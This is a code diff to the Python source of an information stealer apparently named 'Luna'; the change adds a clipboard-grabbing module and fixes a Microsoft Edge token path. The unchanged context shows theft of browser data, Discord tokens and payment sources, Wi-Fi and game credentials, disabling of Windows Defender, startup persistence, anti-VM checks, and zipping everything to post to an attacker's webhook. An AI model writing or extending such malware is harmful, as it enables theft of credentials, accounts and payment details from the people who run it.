@@ -10,6 +10,7 @@ import subprocess
 import sys
 import threading
 import time
+from ctypes import wintypes
 from multiprocessing import cpu_count
 from shutil import copy2
 from zipfile import ZIP_DEFLATED, ZipFile
@@ -17,7 +18,7 @@ from zipfile import ZIP_DEFLATED, ZipFile
 import psutil
 import requests
 from Cryptodome.Cipher import AES
-from PIL import ImageGrab
+from PIL import Image, ImageGrab
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from win32crypt import CryptUnprotectData
 
@@ -40,7 +41,8 @@ __CONFIG__ = {
     "antidebug_vm": False,
     "discord": False,
     "anti_spam": False,
-    "self_destruct": False
+    "self_destruct": False,
+    "clipboard": False
 }
 
 #global variables
@@ -51,7 +53,7 @@ localappdata = os.getenv("localappdata")
 
 
 def main(webhook: str):
-    threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, fakeerror, startup, disable_defender]
+    threads = [Browsers, Wifi, Minecraft, BackupCodes, Clipboard, killprotector, fakeerror, startup, disable_defender]
     configcheck(threads)
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=cpu_count()) as executor:
@@ -71,7 +73,7 @@ def main(webhook: str):
             content = f"@{__CONFIG__['pingtype'].lower()}"
             data.update({"content": content})
 
-    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes"]):
+    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes", "clipboard"]):
         with open(_file, 'rb') as file:
             encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Luna-Logged-{os.getlogin()}.zip', file, 'application/zip')})
             requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
@@ -118,6 +120,8 @@ def configcheck(list):
         list.remove(Minecraft)
     if not __CONFIG__["backupcodes"]:
         list.remove(BackupCodes)
+    if not __CONFIG__["clipboard"]:
+        list.remove(Clipboard)
 
 
 def fakeerror():
@@ -215,8 +219,7 @@ class PcInfo:
                   shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
         username = os.getenv("UserName")
         hostname = os.getenv("COMPUTERNAME")
-        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
-                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
+        hwid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
         ip = requests.get('https://api.ipify.org').text
         interface, addrs = next(iter(psutil.net_if_addrs().items()))
         mac = addrs[0].address
@@ -305,7 +308,7 @@ class Discord:
             'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
             'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
             'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
-            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
+            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
             'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
             'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
             'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
@@ -430,8 +433,7 @@ class Discord:
                 'Authorization': token
             }
             user = requests.get(self.baseurl, headers=headers).json()
-            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources",
-                                   headers=headers).json()
+            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
             username = user['username'] + '#' + user['discriminator']
             discord_id = user['id']
             avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" \
@@ -834,6 +836,24 @@ class SelfDestruct():
             os.remove(self.path)
 
 
+class Clipboard:
+    def __init__(self) -> None:
+        self.directory = os.path.join(temp_path, "Clipboard")
+        os.makedirs(self.directory, exist_ok=True)
+        self.get_clipboard()
+
+    def get_clipboard(self) -> None:
+        process = subprocess.run("powershell Get-Clipboard", shell=True, capture_output=True)
+        if process.returncode == 0:
+            content = process.stdout.decode(errors="ignore").strip()
+            if content:
+                with open(os.path.join(self.directory, "clipboard.txt"), "w", encoding="utf-8") as file:
+                    file.write(content)
+            else:
+                with open(os.path.join(self.directory, "clipboard.txt"), "w", encoding="utf-8") as file:
+                    file.write("Clipboard is empty")
+
+
 class Injection:
     def __init__(self, webhook: str) -> None:
         self.appdata = os.getenv('LOCALAPPDATA')
@@ -1001,7 +1021,7 @@ class Debug:
     def get_system(self) -> bool:
         username = os.getenv("UserName")
         hostname = os.getenv("COMPUTERNAME")
-        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
+        hwid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
                                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
 
         if hwid in self.blackListedHWIDS:
